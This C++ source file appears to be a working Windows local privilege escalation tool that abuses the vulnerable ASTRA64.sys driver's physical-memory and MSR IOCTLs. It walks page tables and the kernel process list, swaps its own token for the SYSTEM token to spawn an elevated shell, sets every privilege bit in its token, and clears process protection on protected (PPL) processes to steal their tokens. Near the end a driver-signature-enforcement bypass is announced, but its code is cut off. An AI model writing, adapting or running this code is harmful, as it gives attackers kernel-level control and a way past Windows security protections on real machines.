/*
 * astra64_all.cpp  —  All LPE techniques via ASTRA64.sys physical R/W
 *
 * ASTRA64.sys IOCTLs (from LOLDrivers #294):
 *   0x80002008       MAP_PHYS    — map physical page into user VA
 *   0x800020EC       READ_MSR    — rdmsr arbitrary index
 *   0x80002028-3C    PORT_IO     — in/out byte/word/dword
 *   0x80002064       PCI_READ    — HalGetBusDataByOffset
 *
 * Techniques:
 *   token  — DKOM direct physical token swap → SYSTEM shell
 *   priv   — Enable all privileges in our own _TOKEN (no token swap)
 *   ppl    — PPL bypass: clear EPROCESS.Protection, OpenProcess, dup token
 *   dse    — Disable ci!g_CiEnabled → load unsigned Driver11.sys
 *
 * Build:  build.bat (MSVC x64, /std:c++17)
 * Usage:  astra64_all.exe <token|priv|ppl|dse> [opts]
 *         astra64_all.exe ppl [process_name]   (default: csrss.exe)
 *         astra64_all.exe dse [driver_path]
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define NTDDI_VERSION 0x0A000000
#include <windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// ─── ASTRA64 IOCTLs ──────────────────────────────────────────────────────────
#define IOCTL_MAP_PHYS  0x80002008u
#define IOCTL_READ_MSR  0x800020ECu
#define DEVICE_PATH     "\\\\.\\Astra32Device0"
#define SERVICE_NAME    "ASTRA64"

// ─── Kernel constants ─────────────────────────────────────────────────────────
#define IA32_LSTAR       0xC0000082u
#define KUSD_VA          0xFFFFF78000000000ULL
#define EX_FAST_REF_MASK 0xFULL

// EPROCESS.Protection (_PS_PROTECTION, 1 byte) offset by build
// Win10 19041-21H2 (19044): 0x87A
// Win11 22000-22621:        0x87A  (same range)
// Win11 26100+:             0x4FA  (structure shrank)
#define EP_PROT_WIN10   0x87Au
#define EP_PROT_WIN11_24H2 0x4FAu

// _TOKEN.Privileges (_SEP_TOKEN_PRIVILEGES) offset — stable across Win10/11
// +0x40 Present  (all privs the token could have)
// +0x48 Enabled  (currently enabled privs)
// +0x50 EnabledByDefault
#define TOKEN_PRIVS_OFF 0x40u

// Driver for DSE technique
#define DSE_DRIVER_PATH "C:\\Users\\kuvee\\source\\repos\\Driver11\\x64\\Release\\Driver11.sys"
#define DSE_DRIVER_SVC  "Driver11"

static bool is_kptr(uint64_t v) {
    return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL;
}

// ─────────────────────────────────────────────────────────────────────────────
//  NtQuerySystemInformation
// ─────────────────────────────────────────────────────────────────────────────
typedef NTSTATUS (NTAPI *pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);
static pfnNtQSI NtQSI;

struct RTL_MOD {
    PVOID  Section;         // 8 bytes — HANDLE stored as pointer
    PVOID  MappedBase;      // 8 bytes
    PVOID  ImageBase;       // 8 bytes — kernel VA we want
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIdx, InitOrderIdx, LoadCount, NameOffset;
    CHAR   FullName[256];
};
struct RTL_MODS { ULONG Count; RTL_MOD Mods[1]; };

static RTL_MODS *get_kernel_modules() {
    ULONG sz = 0x10000;
    RTL_MODS *buf = NULL;
    NTSTATUS st;
    do {
        free(buf);
        buf = (RTL_MODS *)malloc(sz);
        if (!buf) return NULL;
        st = NtQSI(11, buf, sz, &sz);
    } while (st == (NTSTATUS)0xC0000004L);
    if (st) { free(buf); return NULL; }
    return buf;
}

static uint64_t get_module_kbase(RTL_MODS *mods, const char *name) {
    for (ULONG i = 0; i < mods->Count; i++) {
        const char *fn = mods->Mods[i].FullName + mods->Mods[i].NameOffset;
        if (_stricmp(fn, name) == 0)
            return (uint64_t)(uintptr_t)mods->Mods[i].ImageBase;
    }
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  MAP_INPUT struct
// ─────────────────────────────────────────────────────────────────────────────
#pragma pack(push,1)
struct MAP_INPUT {
    uint32_t interface_type;
    uint32_t bus_number;
    uint64_t physical_addr;
    uint32_t address_space;
    uint32_t size;
};
#pragma pack(pop)

// ─────────────────────────────────────────────────────────────────────────────
//  Astra device wrapper
// ─────────────────────────────────────────────────────────────────────────────
struct Astra {
    HANDLE   dev     = INVALID_HANDLE_VALUE;
    uint64_t hint_hi = 0;

    bool open() {
        dev = CreateFileA(DEVICE_PATH, GENERIC_READ|GENERIC_WRITE,
                          FILE_SHARE_READ|FILE_SHARE_WRITE,
                          NULL, OPEN_EXISTING, 0, NULL);
        return dev != INVALID_HANDLE_VALUE;
    }
    void close() {
        if (dev != INVALID_HANDLE_VALUE) { CloseHandle(dev); dev = INVALID_HANDLE_VALUE; }
    }

    bool read_msr(uint32_t idx, uint64_t *out) {
        uint8_t io[8] = {}; memcpy(io, &idx, 4);
        DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_READ_MSR, io, 4, io, 8, &ret, NULL)) return false;
        memcpy(out, io, 8); return true;
    }

    uintptr_t map_page(uint64_t phys_page) {
        MAP_INPUT inp = {}; inp.physical_addr = phys_page; inp.size = 0x1000;
        DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_MAP_PHYS,
                             &inp, sizeof(inp), &inp, sizeof(inp), &ret, NULL)) return 0;
        uint64_t lo = (uint64_t)(uint32_t)inp.interface_type;
        if (!lo) return 0;

        auto try_hi = [&](uint64_t hi) -> uintptr_t {
            uint64_t cand = (hi << 32) | lo;
            MEMORY_BASIC_INFORMATION mbi;
            return (VirtualQuery((LPCVOID)cand, &mbi, sizeof(mbi)) > 0
                    && mbi.State == MEM_COMMIT) ? (uintptr_t)cand : 0;
        };
        if (auto va = try_hi(hint_hi)) return va;
        for (uint64_t hi = 0; hi < 0x8000; hi++) {
            if (hi == hint_hi) continue;
            if (auto va = try_hi(hi)) { hint_hi = hi; return va; }
        }
        return 0;
    }

    void unmap(uintptr_t va) { UnmapViewOfFile((LPCVOID)(va & ~(uintptr_t)0xFFF)); }

    static bool safe_copy(uintptr_t src, void *dst, size_t n) {
        SIZE_T rd = 0;
        return ReadProcessMemory(GetCurrentProcess(), (LPCVOID)src, dst, n, &rd) && rd == n;
    }

    bool read_phys(uint64_t addr, void *buf, size_t len) {
        auto *dst = (uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF;
            size_t   off  = (size_t)(addr & 0xFFF);
            size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(page);
            if (!va) return false;
            bool ok = safe_copy(va + off, dst + pos, chunk);
            unmap(va);
            if (!ok) return false;
            pos += chunk; addr += chunk;
        }
        return true;
    }

    bool write_phys(uint64_t addr, const void *buf, size_t len) {
        auto *src = (const uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF;
            size_t   off  = (size_t)(addr & 0xFFF);
            size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(page);
            if (!va) return false;
            memcpy((void *)(va + off), src + pos, chunk);
            unmap(va);
            pos += chunk; addr += chunk;
        }
        return true;
    }

    bool read_u8 (uint64_t pa, uint8_t  *v) { return read_phys(pa, v, 1); }
    bool read_u32(uint64_t pa, uint32_t *v) { return read_phys(pa, v, 4); }
    bool read_u64(uint64_t pa, uint64_t *v) { return read_phys(pa, v, 8); }
    bool write_u8 (uint64_t pa, uint8_t  v) { return write_phys(pa, &v, 1); }
    bool write_u64(uint64_t pa, uint64_t v) { return write_phys(pa, &v, 8); }
};

// ─────────────────────────────────────────────────────────────────────────────
//  Page-table walk + virtual R/W
// ─────────────────────────────────────────────────────────────────────────────
static bool virt_to_phys(Astra *d, uint64_t cr3, uint64_t va, uint64_t *pa) {
    auto idx = [&](int lvl) { return (va >> (12 + lvl*9)) & 0x1FF; };
    uint64_t e = 0;
    if (!d->read_u64((cr3 & 0x000FFFFFFFFFF000ULL) + idx(3)*8, &e) || !(e&1)) return false;
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(2)*8, &e) || !(e&1)) return false;
    if (e & 0x80) { *pa=(e&0x000FFFFC0000000ULL)|(va&0x3FFFFFFFULL); return true; }
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(1)*8, &e) || !(e&1)) return false;
    if (e & 0x80) { *pa=(e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFFULL);  return true; }
    if (!d->read_u64((e   & 0x000FFFFFFFFFF000ULL) + idx(0)*8, &e) || !(e&1)) return false;
    *pa = (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);
    return true;
}

static bool vread(Astra *d, uint64_t cr3, uint64_t va, void *buf, size_t len) {
    auto *dst = (uint8_t *)buf;
    for (size_t pos = 0; pos < len; ) {
        size_t off = (size_t)(va & 0xFFF), chunk = std::min(len-pos, (size_t)(0x1000-off));
        uint64_t pa;
        if (!virt_to_phys(d, cr3, va, &pa)) return false;
        if (!d->read_phys(pa, dst+pos, chunk)) return false;
        pos += chunk; va += chunk;
    }
    return true;
}

static bool vread_u8 (Astra *d, uint64_t cr3, uint64_t va, uint8_t  *v) { return vread(d,cr3,va,v,1); }
static bool vread_u32(Astra *d, uint64_t cr3, uint64_t va, uint32_t *v) { return vread(d,cr3,va,v,4); }
static bool vread_u64(Astra *d, uint64_t cr3, uint64_t va, uint64_t *v) { return vread(d,cr3,va,v,8); }

// ─────────────────────────────────────────────────────────────────────────────
//  CR3 / ntoskrnl discovery
// ─────────────────────────────────────────────────────────────────────────────
static uint64_t find_cr3(Astra *d) {
    const uint64_t idx = (KUSD_VA >> 39) & 0x1FF;
    printf("[*] Scanning low 64 MB for CR3...\n");
    std::vector<uint64_t> cands;
    for (uint64_t pg = 0; pg < 0x4000000ULL; pg += 0x1000) {
        uint64_t e = 0;
        if (!d->read_u64(pg + idx*8, &e)) continue;
        if (!(e&1)) continue;
        if ((e & 0x000FFFFFFFFFF000ULL) > 0x80000000ULL) continue;
        cands.push_back(pg);
    }
    printf("[*] %zu candidates, verifying...\n", cands.size());
    for (uint64_t cr3 : cands) {
        uint64_t pa; uint32_t v = 0;
        if (virt_to_phys(d,cr3,KUSD_VA,&pa) && d->read_u32(pa+0x26C,&v) && v==10)
            return cr3;
    }
    return 0;
}

static uint64_t find_kernel_base(Astra *d, uint64_t cr3, uint64_t lstar) {
    uint64_t addr = lstar & ~(uint64_t)0xFFF;
    for (uint64_t i = 0; i < 0x4000; i++, addr -= 0x1000) {
        if (!is_kptr(addr)) break;
        uint8_t h[0x200] = {};
        if (!vread(d,cr3,addr,h,sizeof(h))) continue;
        if (h[0]!='M'||h[1]!='Z') continue;
        uint32_t lfn = *(uint32_t*)(h+0x3C);
        if ((size_t)lfn+0x54 > sizeof(h)) continue;
        if (memcmp(h+lfn,"PE\0\0",4)) continue;
        if (*(uint16_t*)(h+lfn+4)!=0x8664) continue;
        if (*(uint16_t*)(h+lfn+24)!=0x020B) continue;
        uint32_t sz = *(uint32_t*)(h+lfn+0x50);
        if (sz < 0x100000 || addr+sz <= lstar) continue;
        return addr;
    }
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Disk PE helpers
// ─────────────────────────────────────────────────────────────────────────────
static uintptr_t load_image(const char *name) {
    return (uintptr_t)LoadLibraryExA(name, NULL, DONT_RESOLVE_DLL_REFERENCES);
}
static uint64_t export_rva(uintptr_t base, const char *name) {
    FARPROC p = GetProcAddress((HMODULE)base, name);
    return p ? (uint64_t)((uintptr_t)p - base) : 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  EPROCESS offsets + walk
// ─────────────────────────────────────────────────────────────────────────────
struct EpOff { uint64_t pid, links, token; uint32_t prot; };

static DWORD g_build = 0;

static EpOff detect_ep_offsets() {
    typedef NTSTATUS(NTAPI *fn)(PRTL_OSVERSIONINFOW);
    auto f = (fn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    RTL_OSVERSIONINFOW ov = {}; ov.dwOSVersionInfoSize = sizeof(ov);
    if (f) f(&ov);
    g_build = ov.dwBuildNumber;
    printf("[*] Build: %lu\n", g_build);
    if (g_build >= 26100) return {0x1D0, 0x1D8, 0x248, EP_PROT_WIN11_24H2};
    return              {0x440, 0x448, 0x4B8, EP_PROT_WIN10};
}

static bool find_eprocess(Astra *d, uint64_t cr3,
                           uint64_t nt_kbase, uintptr_t nt_disk,
                           const EpOff &ep, uint32_t tgt_pid,
                           uint64_t *sys_ep, uint64_t *tgt_ep) {
    uint64_t rva = export_rva(nt_disk, "PsInitialSystemProcess");
    if (!rva) { printf("[-] PsInitialSystemProcess missing\n"); return false; }
    uint64_t se = 0;
    if (!vread_u64(d,cr3,nt_kbase+rva,&se)||!is_kptr(se)) {
        printf("[-] *PsInitialSystemProcess invalid\n"); return false;
    }
    uint64_t spid = 0; vread_u64(d,cr3,se+ep.pid,&spid);
    if (spid != 4) { printf("[-] System PID=%llu\n",(unsigned long long)spid); return false; }
    *sys_ep = se;
    if (tgt_pid == 4) { *tgt_ep = se; return true; }

    uint64_t head = 0, flink = 0;
    if (!vread_u64(d,cr3,se+ep.links+8,&head)||!is_kptr(head)) return false;
    if (!vread_u64(d,cr3,head,&flink)) return false;

    for (int i = 0; i < 4096 && flink != head; i++) {
        uint64_t ep_va = flink - ep.links;
        uint64_t pid = 0;
        if (vread_u64(d,cr3,ep_va+ep.pid,&pid) && (uint32_t)pid == tgt_pid)
            { *tgt_ep = ep_va; return true; }
        uint64_t nxt = 0;
        if (!vread_u64(d,cr3,flink,&nxt)||!is_kptr(nxt)) break;
        flink = nxt;
    }
    printf("[-] PID %u not found\n", tgt_pid); return false;
}

// Walk all EPROCESS entries, collect those with Protection != 0
struct PplEntry { uint64_t ep_va; uint32_t pid; uint8_t prot; char name[20]; };

static std::vector<PplEntry> find_ppl_processes(Astra *d, uint64_t cr3,
                                                  uint64_t nt_kbase, uintptr_t nt_disk,
                                                  const EpOff &ep) {
    std::vector<PplEntry> result;
    uint64_t rva = export_rva(nt_disk, "PsInitialSystemProcess");
    if (!rva) return result;
    uint64_t se = 0;
    if (!vread_u64(d,cr3,nt_kbase+rva,&se)||!is_kptr(se)) return result;

    // Get process names from system snapshot (reliable)
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    auto get_name = [&](uint32_t pid) -> const char* {
        static char buf[32];
        if (snap == INVALID_HANDLE_VALUE) { sprintf_s(buf,"pid%u",pid); return buf; }
        PROCESSENTRY32W pe = { sizeof(pe) };
        if (Process32FirstW(snap, &pe)) do {
            if (pe.th32ProcessID == pid) {
                WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, buf, 32, NULL, NULL);
                return buf;
            }
        } while (Process32NextW(snap, &pe));
        sprintf_s(buf,"pid%u",pid); return buf;
    };

    uint64_t head = 0, flink = 0;
    vread_u64(d,cr3,se+ep.links+8,&head);
    vread_u64(d,cr3,head,&flink);

    // System process itself
    {
        uint8_t prot = 0;
        vread_u8(d,cr3,se+ep.prot,&prot);
        if (prot) {
            PplEntry e{}; e.ep_va=se; e.pid=4; e.prot=prot;
            strcpy_s(e.name, 20, "System");
            result.push_back(e);
        }
    }

    for (int i = 0; i < 4096 && flink != head; i++) {
        uint64_t ep_va = flink - ep.links;

        // One page walk for flink (= ep_va+ep.links), then derive adjacent PAs.
        uint64_t pa_flink = 0;
        if (!virt_to_phys(d, cr3, flink, &pa_flink) || !pa_flink) break;

        // pid is ep.links - ep.pid = 8 bytes before flink on same page.
        uint64_t pid = 0;
        d->read_u64(pa_flink - (ep.links - ep.pid), &pid);

        // nxt Flink is at flink itself.
        uint64_t nxt = 0;
        d->read_u64(pa_flink, &nxt);

        // prot: try same page first (works when EPROCESS is page-aligned, common case).
        uint8_t prot = 0;
        uint64_t prot_delta = ep.prot - ep.links;
        if ((pa_flink & 0xFFF) + prot_delta < 0x1000)
            d->read_u8(pa_flink + prot_delta, &prot);
        else
            vread_u8(d, cr3, ep_va + ep.prot, &prot);

        if (prot && pid) {
            PplEntry e{}; e.ep_va=ep_va; e.pid=(uint32_t)pid; e.prot=prot;
            strcpy_s(e.name, 20, get_name((uint32_t)pid));
            result.push_back(e);
        }
        if (!is_kptr(nxt)) break;
        flink = nxt;
    }
    if (snap != INVALID_HANDLE_VALUE) CloseHandle(snap);
    return result;
}

// ─────────────────────────────────────────────────────────────────────────────
//  SCM helpers
// ─────────────────────────────────────────────────────────────────────────────
static bool register_driver(const char *svc, const char *path) {
    SC_HANDLE mgr = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!mgr) return false;
    SC_HANDLE s = OpenServiceA(mgr, svc, SERVICE_ALL_ACCESS);
    if (s) { DeleteService(s); CloseServiceHandle(s); }
    s = CreateServiceA(mgr, svc, svc, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                       SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, path,
                       NULL, NULL, NULL, NULL, NULL);
    if (!s) { CloseServiceHandle(mgr); return false; }
    BOOL ok = StartService(s, 0, NULL);
    DWORD e  = GetLastError();
    CloseServiceHandle(s); CloseServiceHandle(mgr);
    return ok || e == ERROR_SERVICE_ALREADY_RUNNING;
}

static bool open_astra(Astra *drv) {
    if (!drv->open()) {
        printf("[-] Cannot open %s: %lu\n", DEVICE_PATH, GetLastError());
        return false;
    }
    printf("[+] Device: %s\n", DEVICE_PATH);
    return true;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Common setup: open device, get CR3, ntoskrnl, EPROCESS walk
// ─────────────────────────────────────────────────────────────────────────────
struct KernelCtx {
    Astra    drv;
    uint64_t cr3       = 0;
    uint64_t nt_kbase  = 0;
    uintptr_t nt_disk  = 0;
    EpOff    ep        = {};
    uint64_t sys_ep    = 0;
    uint64_t my_ep     = 0;
    uint64_t pa_sys_tok = 0;
    uint64_t pa_my_tok  = 0;
    uint64_t sys_tok   = 0;
    uint64_t orig_tok  = 0;
};

static bool kctx_init(KernelCtx *k) {
    if (!open_astra(&k->drv)) return false;

    k->cr3 = find_cr3(&k->drv);
    if (!k->cr3) { printf("[-] CR3 not found\n"); return false; }
    printf("[+] CR3 = 0x%llX\n", (unsigned long long)k->cr3);

    // NtQuerySystemInformation(11) trả về kernel module list ngay lập tức,
    // không cần walk ~1000 trang virtual như find_kernel_base (LSTAR walkback).
    RTL_MODS *mods = get_kernel_modules();
    if (!mods) { printf("[-] NtQuerySystemInformation failed\n"); return false; }
    k->nt_kbase = get_module_kbase(mods, "ntoskrnl.exe");
    free(mods);
    if (!k->nt_kbase) { printf("[-] ntoskrnl not in module list\n"); return false; }
    printf("[+] ntoskrnl = 0x%llX\n", (unsigned long long)k->nt_kbase);

    k->nt_disk = load_image("ntoskrnl.exe");
    if (!k->nt_disk) { printf("[-] LoadLibraryEx(ntoskrnl.exe)\n"); return false; }

    k->ep = detect_ep_offsets();
    printf("[*] EPROCESS: pid=+0x%llX links=+0x%llX token=+0x%llX prot=+0x%X\n",
           (unsigned long long)k->ep.pid, (unsigned long long)k->ep.links,
           (unsigned long long)k->ep.token, k->ep.prot);

    uint32_t my_pid = GetCurrentProcessId();
    printf("[*] Walking EPROCESS (PID 4 + %u)...\n", my_pid);
    if (!find_eprocess(&k->drv, k->cr3, k->nt_kbase, k->nt_disk,
                       k->ep, my_pid, &k->sys_ep, &k->my_ep)) return false;
    printf("[+] System EPROCESS = 0x%llX\n", (unsigned long long)k->sys_ep);
    printf("[+] Our    EPROCESS = 0x%llX\n", (unsigned long long)k->my_ep);

    if (!virt_to_phys(&k->drv, k->cr3, k->sys_ep+k->ep.token, &k->pa_sys_tok) ||
        !virt_to_phys(&k->drv, k->cr3, k->my_ep +k->ep.token, &k->pa_my_tok)) {
        printf("[-] virt_to_phys token failed\n"); return false;
    }
    k->drv.read_u64(k->pa_sys_tok, &k->sys_tok);
    k->drv.read_u64(k->pa_my_tok,  &k->orig_tok);
    return true;
}

// Do the token swap; returns true if elevated
static bool do_token_swap(KernelCtx *k) {
    printf("[*] Swapping token → SYSTEM...\n");
    if (!k->drv.write_u64(k->pa_my_tok, k->sys_tok)) {
        printf("[-] Token write failed\n"); return false;
    }
    BOOL elev = FALSE;
    HANDLE t;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) {
        TOKEN_ELEVATION te; DWORD sz = sizeof(te);
        GetTokenInformation(t, TokenElevation, &te, sz, &sz);
        elev = te.TokenIsElevated; CloseHandle(t);
    }
    return !!elev;
}

static void restore_token(KernelCtx *k) {
    Astra drv2;
    if (drv2.open()) {
        uint64_t pa2 = 0;
        if (virt_to_phys(&drv2, k->cr3, k->my_ep+k->ep.token, &pa2))
            drv2.write_u64(pa2, k->orig_tok);
        drv2.close();
        printf("[+] Token restored\n");
    }
}

static BOOL spawn_shell(bool new_console = true) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    char cmd[] = "cmd.exe";
    DWORD flags = new_console ? CREATE_NEW_CONSOLE : 0;
    BOOL ok = CreateProcessA(NULL, cmd, NULL, NULL, FALSE, flags, NULL, NULL, &si, &pi);
    if (ok) {
        printf("[+] cmd.exe spawned (PID %lu)\n", pi.dwProcessId);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    } else printf("[-] CreateProcess: %lu\n", GetLastError());
    return ok;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Technique 1: Direct DKOM token swap
// ─────────────────────────────────────────────────────────────────────────────
static int run_token() {
    printf("\n=== Technique 1: DKOM Token Swap ===\n");
    KernelCtx k;
    if (!kctx_init(&k)) return 1;
    printf("[+] System token = 0x%llX\n", (unsigned long long)k.sys_tok);
    printf("[+] Our    token = 0x%llX\n", (unsigned long long)k.orig_tok);
    if (!do_token_swap(&k)) { printf("[-] Token swap failed\n"); return 1; }
    printf("[+] ELEVATED — spawning SYSTEM shell\n");
    spawn_shell();
    Sleep(2000);
    restore_token(&k);
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Technique 2: Enable all privileges in our own _TOKEN
//  No process token swap — just enable every privilege bit.
//  Useful when you need specific privileges (SeLoadDriver, SeDebug, etc.)
//  without fully impersonating SYSTEM.
// ─────────────────────────────────────────────────────────────────────────────
static int run_priv() {
    printf("\n=== Technique 2: Enable All Token Privileges ===\n");
    KernelCtx k;
    if (!kctx_init(&k)) return 1;

    // Read our token pointer from EPROCESS (physical)
    uint64_t my_tok_ref = 0;
    k.drv.read_u64(k.pa_my_tok, &my_tok_ref);
    uint64_t tok_ptr = my_tok_ref & ~EX_FAST_REF_MASK;
    if (!is_kptr(tok_ptr)) { printf("[-] Token ptr invalid\n"); return 1; }
    printf("[+] _TOKEN @ 0x%llX\n", (unsigned long long)tok_ptr);

    // Translate _TOKEN.Privileges.Present and .Enabled VA → PA
    uint64_t pa_present = 0, pa_enabled = 0;
    if (!virt_to_phys(&k.drv, k.cr3, tok_ptr + TOKEN_PRIVS_OFF,     &pa_present) ||
        !virt_to_phys(&k.drv, k.cr3, tok_ptr + TOKEN_PRIVS_OFF + 8, &pa_enabled)) {
        printf("[-] Cannot translate privilege fields\n"); return 1;
    }

    uint64_t old_present = 0, old_enabled = 0;
    k.drv.read_u64(pa_present, &old_present);
    k.drv.read_u64(pa_enabled, &old_enabled);
    printf("[*] Present = 0x%016llX\n", (unsigned long long)old_present);
    printf("[*] Enabled = 0x%016llX\n", (unsigned long long)old_enabled);

    // Enable all privileges
    k.drv.write_u64(pa_present, 0xFFFFFFFFFFFFFFFF);
    k.drv.write_u64(pa_enabled, 0xFFFFFFFFFFFFFFFF);

    uint64_t new_present = 0, new_enabled = 0;
    k.drv.read_u64(pa_present, &new_present);
    k.drv.read_u64(pa_enabled, &new_enabled);
    printf("[+] Present → 0x%016llX\n", (unsigned long long)new_present);
    printf("[+] Enabled → 0x%016llX\n", (unsigned long long)new_enabled);
    printf("[+] All privileges enabled (SE_DEBUG, SE_LOAD_DRIVER, SE_TCB, ...)\n");

    // Spawn a child with our now-omnipotent token
    printf("[*] Spawning shell with all privileges...\n");
    spawn_shell();

    // Restore (optional — token object is shared, so restore is polite)
    Sleep(1000);
    k.drv.write_u64(pa_present, old_present);
    k.drv.write_u64(pa_enabled, old_enabled);
    printf("[+] Privileges restored\n");
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Technique 3: PPL bypass
//  Clear EPROCESS.Protection (1 byte) → OpenProcess(PROCESS_ALL_ACCESS)
//  → duplicate token from a SYSTEM PPL process → CreateProcessWithToken
// ─────────────────────────────────────────────────────────────────────────────
static int run_ppl(const char *target_name) {
    printf("\n=== Technique 3: PPL Bypass (target: %s) ===\n", target_name);
    KernelCtx k;
    if (!kctx_init(&k)) return 1;

    // First get SYSTEM token so we have SeAssignPrimaryToken + SeImpersonate
    if (!do_token_swap(&k)) { printf("[-] Need SYSTEM first\n"); return 1; }
    printf("[+] Now SYSTEM — proceeding with PPL bypass\n");

    // Find all PPL processes
    printf("[*] Scanning EPROCESS list for PPL processes...\n");
    auto ppl_list = find_ppl_processes(&k.drv, k.cr3, k.nt_kbase, k.nt_disk, k.ep);

    if (ppl_list.empty()) { printf("[-] No PPL processes found\n"); restore_token(&k); return 1; }

    // _PS_PROTECTION decode helper
    auto prot_str = [](uint8_t p) -> const char* {
        static char buf[32];
        const char *types[] = {"None","PPL","PP","??"};
        const char *signers[] = {"None","Authenticode","CodeGen","Antimalware",
                                  "Lsa","Windows","WinTcb","WinSystem"};
        uint8_t type = p & 7, signer = (p >> 4) & 0xF;
        sprintf_s(buf, "%s-%s(0x%02X)",
                  types[type < 4 ? type : 3],
                  signers[signer < 8 ? signer : 0], p);
        return buf;
    };

    printf("\n[*] PPL processes found:\n");
    for (auto &e : ppl_list)
        printf("    PID %5u  %-20s  %s\n", e.pid, e.name, prot_str(e.prot));

    // Find target
    PplEntry *target = nullptr;
    for (auto &e : ppl_list) {
        if (_stricmp(e.name, target_name) == 0) { target = &e; break; }
    }
    if (!target) {
        // Auto-pick: first non-System, non-smss, non-csrss-if-not-requested PPL
        // that we haven't explicitly excluded
        const char *skip[] = {"System","smss.exe"};
        for (auto &e : ppl_list) {
            bool ok = true;
            for (auto s : skip) if (_stricmp(e.name,s)==0) { ok=false; break; }
            if (ok) { target = &e; break; }
        }
    }
    if (!target) { printf("[-] Target '%s' not found in PPL list\n", target_name); restore_token(&k); return 1; }

    printf("\n[*] Targeting: %s (PID %u)  Protection=0x%02X (%s)\n",
           target->name, target->pid, target->prot, prot_str(target->prot));

    // Translate EPROCESS.Protection VA → PA
    uint64_t prot_va = target->ep_va + k.ep.prot;
    uint64_t prot_pa = 0;
    if (!virt_to_phys(&k.drv, k.cr3, prot_va, &prot_pa)) {
        printf("[-] Cannot translate Protection field\n"); restore_token(&k); return 1;
    }

    // Save original protection byte
    uint8_t orig_prot = target->prot;

    // Verify OpenProcess fails before bypass
    HANDLE h_before = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target->pid);
    printf("[*] OpenProcess before bypass: %s (err=%lu)\n",
           h_before ? "succeeded (already accessible?)" : "FAILED",
           h_before ? 0 : GetLastError());
    if (h_before) CloseHandle(h_before);

    // ── PATCH: clear protection byte ─────────────────────────────────────────
    printf("[*] Clearing EPROCESS.Protection (PA=0x%llX) 0x%02X → 0x00...\n",
           (unsigned long long)prot_pa, orig_prot);
    k.drv.write_u8(prot_pa, 0x00);

    // ── OpenProcess ───────────────────────────────────────────────────────────
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target->pid);
    if (!hProc) {
        printf("[-] OpenProcess still failed: %lu\n", GetLastError());
        k.drv.write_u8(prot_pa, orig_prot);
        restore_token(&k);
        return 1;
    }
    printf("[+] OpenProcess(PROCESS_ALL_ACCESS, %u) → SUCCESS\n", target->pid);

    // Duplicate token from the PPL process
    HANDLE hTok = NULL, hNew = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_ASSIGN_PRIMARY, &hTok)) {
        printf("[-] OpenProcessToken: %lu\n", GetLastError());
    } else {
        if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                              SecurityImpersonation, TokenPrimary, &hNew)) {
            printf("[-] DuplicateTokenEx: %lu\n", GetLastError());
        } else {
            printf("[+] Token duplicated from %s\n", target->name);
        }
        CloseHandle(hTok);
    }

    // ── RESTORE protection immediately ────────────────────────────────────────
    k.drv.write_u8(prot_pa, orig_prot);
    printf("[+] EPROCESS.Protection restored to 0x%02X\n", orig_prot);
    CloseHandle(hProc);

    // ── Spawn shell with duplicated token ─────────────────────────────────────
    if (hNew) {
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        wchar_t cmd[] = L"cmd.exe";
        if (CreateProcessWithTokenW(hNew, LOGON_WITH_PROFILE, NULL, cmd,
                                    CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("[+] Shell spawned from %s token (PID %lu)\n",
                   target->name, pi.dwProcessId);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        } else {
            printf("[-] CreateProcessWithTokenW: %lu\n", GetLastError());
        }
        CloseHandle(hNew);
    }

    Sleep(2000);
    restore_token(&k);
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Technique 4: DSE bypass
//  Find ci!g_CiEnabled via CiInitialize pattern scan → write 0 → load driver
// ─────────────────────────────────────────────────────────────────────────────

// Scan the disk copy of CiInitialize for MOV [RIP+disp32], reg32
// and return the first candidate RVA that lands in a plausible data range.
